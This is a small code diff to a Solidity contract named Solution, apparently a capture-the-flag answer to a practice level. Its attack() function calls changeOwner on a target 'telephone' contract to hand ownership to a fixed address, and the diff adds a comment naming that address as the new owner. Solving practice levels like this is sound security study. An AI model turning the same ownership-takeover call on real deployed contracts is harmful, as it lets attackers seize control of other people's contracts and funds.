@@ -9,6 +9,7 @@ contract Solution
 
     function attack() public
     {
+        // 0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B becomes the new owner
         (bool success,) = telephoneContract.call(abi.encodeWithSignature("changeOwner(address)", address(0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B)));
         require(success == true, "Call to changeOwner() failed");
     }
